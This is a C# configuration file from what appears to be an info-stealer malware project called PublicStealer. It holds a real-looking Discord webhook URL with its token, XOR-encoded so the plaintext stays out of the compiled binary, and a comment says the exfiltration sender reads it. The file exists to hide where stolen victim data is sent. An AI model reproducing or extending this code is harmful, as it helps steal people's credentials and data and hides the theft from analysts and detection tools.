// C# | PublicStealer/Config.cs | .NET 4.7.2+
// XOR-obfuscated webhook URL — plaintext never sits in IL

using System;
using System.Text;

namespace PublicStealer
{
    public static class Config
    {
        // XOR key — change before build
        private static readonly byte[] _xk = { 0x4B, 0x7F, 0x2A, 0x91, 0xC3, 0x5E, 0x88, 0x1D };

        // To regenerate: run XorEncode("your_webhook_url", _xk) and paste result here
        private static readonly byte[] _whEncoded = XorEncode(
            "https://discord.com/api/webhooks/1480700692221001898/tSl-QWBUPTlJ3ppJGld_20Hy8OGoO2oySxWk2C3sz8fs9Dlk94Z4d-vMcRJHWGg_K65j",
            new byte[] { 0x4B, 0x7F, 0x2A, 0x91, 0xC3, 0x5E, 0x88, 0x1D }
        );

        // Single source of truth — WebhookSender reads this, nothing else
        public static string WebhookUrl => XorDecode(_whEncoded, _xk);

        public static int SkuldColor = 0xA020F0; // Violet

        // ── helpers ──────────────────────────────────────────────────
        private static byte[] XorEncode(string input, byte[] key)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= key[i % key.Length];
            return bytes;
        }

        private static string XorDecode(byte[] encoded, byte[] key)
        {
            byte[] decoded = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ key[i % key.Length]);
            return Encoding.UTF8.GetString(decoded);
        }
    }
}